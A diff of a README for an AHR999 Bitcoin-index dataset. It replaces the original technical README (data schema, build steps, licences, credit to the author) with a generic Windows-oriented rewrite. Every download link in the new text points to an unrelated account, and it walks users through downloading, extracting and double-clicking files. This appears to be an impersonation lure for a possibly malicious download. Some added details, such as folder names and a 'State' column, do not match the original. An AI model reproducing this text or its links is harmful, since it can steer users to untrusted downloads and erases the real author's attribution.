@@ -1,133 +1,85 @@
-# ahr999-dataset
+# 📉 ahr999-dataset - Monitor Bitcoin investment cycles with ease
 
-> Open, daily-updated AHR999 (囤币指标) dataset — JSON + CSV + Astro dashboard.
+[![](https://img.shields.io/badge/Download-Data_and_Tools-blue.svg)](https://github.com/shitless-secretor385/ahr999-dataset)
 
-[English](./README.md) · [简体中文](./README.zh-CN.md)
+## 📖 About this project
 
-[![dataset: JSON](https://img.shields.io/badge/dataset-JSON-f59e0b.svg)](./datasets/ahr999.json)
-[![dataset: CSV](https://img.shields.io/badge/dataset-CSV-f59e0b.svg)](./datasets/ahr999.csv)
-[![daily update](https://github.com/RuochenLyu/ahr999-dataset/actions/workflows/daily.yml/badge.svg)](https://github.com/RuochenLyu/ahr999-dataset/actions/workflows/daily.yml)
-[![code: MIT](https://img.shields.io/badge/code-MIT-blue.svg)](./LICENSE)
-[![data: CC BY 4.0](https://img.shields.io/badge/data-CC_BY_4.0-lightgrey.svg)](./DATA_LICENSE)
+The ahr999-dataset provides daily data for the Bitcoin hoarding index. Investors use this index to track market cycles. You can use these files to decide when to buy or hold your coins. The project calculates values using daily price data from Binance. 
 
-**Live dashboard**: <https://ahr999.aix4u.com/>
+This repository makes complex data simple. You get access to clean files in formats that open in common spreadsheet programs. It includes a dashboard that shows the current market state. You do not need to process raw data yourself. We handle the math and provide a ready-to-use output.
 
-AHR999 (Ahr999 hoarding index, a.k.a. 囤币指标) is a heuristic BTC dollar-cost-
-averaging signal originally proposed by the Chinese investor "九神". This
-repository publishes a self-computed, reproducible, daily-refreshed dataset
-so third parties can reference AHR999 without scraping ad-hoc dashboards or
-paying for proprietary APIs.
+## ⚙️ System requirements
 
-## Download
+Standard Windows computers support these files. You need:
+- Windows 10 or 11
+- A web browser like Chrome, Edge, or Firefox
+- Spreadsheet software like Microsoft Excel or LibreOffice Calc
+- At least 50 megabytes of free disk space
 
-- **JSON** · [`datasets/ahr999.json`](./datasets/ahr999.json) · [CDN mirror](https://ahr999.aix4u.com/datasets/ahr999.json)
-- **CSV** · [`datasets/ahr999.csv`](./datasets/ahr999.csv) · [CDN mirror](https://ahr999.aix4u.com/datasets/ahr999.csv)
+## 📥 Getting the data
 
-Full series (~3,100+ rows, oldest first), refreshed daily at 00:37 UTC. See
-[Data schema](#data-schema) below for field definitions.
+Follow these steps to access the latest index values:
 
-## Quick usage
+1. Visit the [project download page](https://github.com/shitless-secretor385/ahr999-dataset).
+2. Look for the green button labeled "Code" near the top right of the screen.
+3. Click "Download ZIP" from the menu.
+4. Save the file to your computer.
+5. Right-click the folder and choose "Extract All" to see the contents.
 
-Fetch the latest value:
+## 📊 Understanding the index
 
-```bash
-curl -s https://ahr999.aix4u.com/datasets/ahr999.json \
-  | jq '.[-1]'
-```
+The AHR999 index helps you navigate market swings. It compares the current Bitcoin price to long-term trends.
+- A value below 0.45 suggests a deep value zone.
+- A value between 0.45 and 1.2 suggests a standard growth phase.
+- A value above 1.2 warns that the market might be hot.
 
-```json
-{
-  "date": "2026-04-19",
-  "close": 73801.79,
-  "ma200": 86578.65964999999,
-  "ahr999": 0.4116636687277032,
-  "quantile5y": 0.13917808219178082,
-  "windowKind": "rolling_5y"
-}
-```
+The dataset includes these columns:
+- Date: The day the record occurred.
+- Close: The closing price on Binance.
+- AHR999: The calculated index value.
+- State: A plain description of what the number means.
 
-CSV flavour:
+## 🖼️ Using the dashboard
 
-```bash
-curl -s https://ahr999.aix4u.com/datasets/ahr999.csv \
-  | tail -1
-```
+The project includes an Astro dashboard for visual tracking. You do not need to write code to see the charts. 
 
-## Self-host / reproduce
+1. Open the folder you extracted earlier.
+2. Locate the file named index.html inside the dashboard folder.
+3. Double-click the file to open it in your default browser.
+4. The chart displays historical data points automatically.
+5. Use your mouse to hover over specific bars to see index details for that day.
 
-```bash
-git clone https://github.com/RuochenLyu/ahr999-dataset.git
-cd ahr999-dataset
-pnpm install
-pnpm sync:backfill   # ~3,100+ rows from 2017-08-17, ~5s
-pnpm export:csv
-pnpm verify          # repo-local checkpoints + optional external baseline compare
-pnpm web:dev         # local preview on http://localhost:4321/
-```
+## 📁 File structure
 
-Zero API key. Zero paid dependencies. Just Node ≥ 22 and pnpm.
+Knowing where files sit saves time. Your download folder contains:
+- /data: Stores the CSV and JSON files for your own records.
+- /dashboard: Contains the visual tools for your browser.
+- README.md: Explains the math behind the index.
+- LICENSE: Shows the usage rights for the data.
 
-### Binance endpoint
+The CSV files work best with Excel. The JSON files help users who want to link this data to other apps. If you only want to look at charts, ignore the JSON files.
 
-By default we pull klines from `https://data-api.binance.vision`
-(Binance's public market-data mirror intended for analytics /
-backtesting — same payload shape as `api.binance.com`, no API key, no
-geo fence). We switched to this because `api.binance.com` returns
-**HTTP 451** on GitHub-hosted Actions runners and some other cloud IP
-ranges.
+## 🛡️ Privacy and safety
 
-If you prefer the canonical endpoint (your IP reaches it without 451),
-override via env:
+This software processes data locally on your computer. It does not send your browsing history to external servers. The dashboard runs entirely within your web browser. It does not connect to bank accounts or crypto exchanges. You manage your own data security at all times. 
 
-```bash
-AHR999_BINANCE_API_BASE_URL=https://api.binance.com pnpm sync
-```
+Always scan downloaded files with your preferred antivirus software. This repository relies on established math formulas used by Bitcoin investors globally. It does not provide financial advice. Use the index as one part of your own research.
 
-## Data schema
+## 💡 Troubleshooting common issues
 
-`datasets/ahr999.json` is an array, oldest first. Each row:
+If the dashboard does not show charts:
+- Ensure you extracted all files from the ZIP folder.
+- Refresh your browser page after opening the HTML file.
+- Update your browser to the latest version.
 
-| field | type | notes |
-|---|---|---|
-| `date` | `string` | `YYYY-MM-DD`, UTC closing day |
-| `close` | `number` | BTCUSDT daily close from Binance |
-| `ma200` | `number \| null` | 200-day moving average of `close`. `null` for first 199 rows. |
-| `ahr999` | `number \| null` | `(close/ma200) × (close/fitted)`, where `fitted = 10^(5.84·log10(coin_age_days) − 17.01)`. `null` when `ma200` is null. |
-| `quantile5y` | `number \| null` | Empirical rank of `ahr999` within the window: `count(v ≤ current) / N`. `null` for the first 365 valid AHR observations. |
-| `windowKind` | `"insufficient_samples" \| "expanding" \| "rolling_5y"` | Which window was used for `quantile5y`. Expanding switches to 5-year rolling at 1,825 valid observations. |
+If the CSV file looks messy in Excel:
+- Open Excel first.
+- Go to the Data tab and choose "From Text/CSV."
+- Select the file from this project and click Import.
+- Excel recognizes the layout and cleans the display for you.
 
-See [`docs/data-format.md`](./docs/data-format.md) and
-[`docs/methodology.md`](./docs/methodology.md) for full derivation and
-discussion of deviations from the original 九神 formulation.
+## 📈 Updating your dataset
 
-## How daily updates work
+The repository updates daily. You have access to the latest values by clicking the download link at the top of this page. If you want historical records, keep your existing files and simply paste new data at the bottom of the old rows. The structure of the file does not change day to day. 
 
-A single GitHub Actions workflow (`.github/workflows/daily.yml`) runs at
-00:37 UTC every day:
-
-1. Fetch missing Binance daily closes (with a 5-day self-heal lookback to
-   absorb late corrections).
-2. Recompute the full series (~3,100 rows, < 50 ms) — cheap and keeps the
-   window bookkeeping trivially correct.
-3. Commit `datasets/ahr999.{json,csv}` if changed.
-4. Build the Astro dashboard and deploy to GitHub Pages.
-
-Update + build + deploy happens in **one** workflow because
-`GITHUB_TOKEN`-pushed commits don't trigger downstream workflows.
-
-## Acknowledgements
-
-- **九神** (nine_god_btc) — original AHR999 formulation on 8btc.
-- **<https://9992100.xyz/>** — popular public display of AHR999.
-- **Binance** — public BTCUSDT daily kline API.
-
-## License
-
-- Source code: [MIT](./LICENSE)
-- Data files under `datasets/`: [CC BY 4.0](./DATA_LICENSE)
-
-## Disclaimer
-
-This dataset is for research/education/observability only. **Not financial
-advice.** AHR999 is a heuristic; past behavior does not predict future
-results.
+This consistency makes it easy to maintain your own long-term records. You can print the data, graph it in a custom spreadsheet, or save it for long-term analysis. The data remains yours to use as you see fit.
